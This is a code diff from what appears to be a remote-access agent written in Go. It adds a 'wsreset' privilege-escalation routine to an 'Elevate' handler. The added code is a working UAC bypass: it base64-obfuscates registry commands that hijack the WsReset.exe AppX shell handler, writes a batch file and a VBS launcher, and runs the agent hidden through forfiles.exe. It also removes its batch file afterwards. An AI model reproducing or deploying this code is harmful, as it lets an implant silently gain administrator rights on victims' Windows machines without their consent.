@@ -71,6 +71,45 @@ func (e Elevate) Run(clientID string, jobID string, args []string) (string, erro
 		if err != nil {
 			return "", err
 		}
+
+	case "wsreset":
+		//REG ADD HKCU\SOFTWARE\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\Open\command /V DelegateExecute /t REG_SZ /F
+		var DelegateExecute string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcQXBwWDgyYTZnd3JlNGZkZzNidDYzNXRuNWN0cWpmOG1zZGQyXFNoZWxsXE9wZW5cY29tbWFuZCAvViBEZWxlZ2F0ZUV4ZWN1dGUgL3QgUkVHX1NaIC9G"
+		DecodedDelegateExecute, _ := base64.StdEncoding.DecodeString(DelegateExecute)
+		//REG ADD HKCU\SOFTWARE\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\Open\command  /t REG_SZ /F  /D "wscript %APPDATA%\build.vbs"
+		var wscriptkey string = "UkVHIEFERCBIS0NVXFNPRlRXQVJFXENsYXNzZXNcQXBwWDgyYTZnd3JlNGZkZzNidDYzNXRuNWN0cWpmOG1zZGQyXFNoZWxsXE9wZW5cY29tbWFuZCAgL3QgUkVHX1NaIC9GICAvRCAid3NjcmlwdCAlQVBQREFUQSVcYnVpbGQudmJzIg=="
+		Decodedwscript, _ := base64.StdEncoding.DecodeString(wscriptkey)
+		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + exAgent + "\", 0, False"
+		//Creates a bat file
+		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
+		if err != nil {
+			return "", err
+		}
+		UAC.WriteString("mkdir %APPDATA%\\Windows" + "\r\n")
+		UAC.WriteString(string(DecodedDelegateExecute) + "\r\n")
+		UAC.WriteString(string(Decodedwscript) + "\r\n")
+		UAC.WriteString("echo " + wscript + " > %APPDATA%\\build.vbs \r\n")
+		UAC.WriteString("timeout 2 \r\n")
+		UAC.WriteString("powershell -command \"& {&'Start-Process' WsReset.exe -WindowStyle Hidden} \"; \r\n")
+		UAC.WriteString("timeout 70 \r\n")
+		//UAC.WriteString("REG DELETE HKCU\\SOFTWARE\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\ /f \r\n")
+		UAC.WriteString("timeout 2 \r\n")
+		//UAC.WriteString("del %APPDATA%\\build.vbs \r\n")
+		// TODO: Remove build.vbs
+		UAC.Close()
+		Exec := exec.Command("cmd", "/C", "C:\\Users\\Public\\build.bat")
+		Exec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		err = Exec.Run()
+		if err != nil {
+			return "", err
+		}
+
+		time.Sleep(time.Duration(70) * time.Second)
+		err = os.Remove("C:\\Users\\Public\\build.bat")
+		if err != nil {
+			return "", err
+		}
+
 	case "ask":
 		wscript := "CreateObject(\"WScript.Shell\").Run \"C:\\Windows\\System32\\forfiles.exe /p c:\\windows\\system32 /m svchost.exe /c " + exAgent + "\", 0, False"
 		UAC, err := os.Create("C:\\Users\\Public\\build.bat")
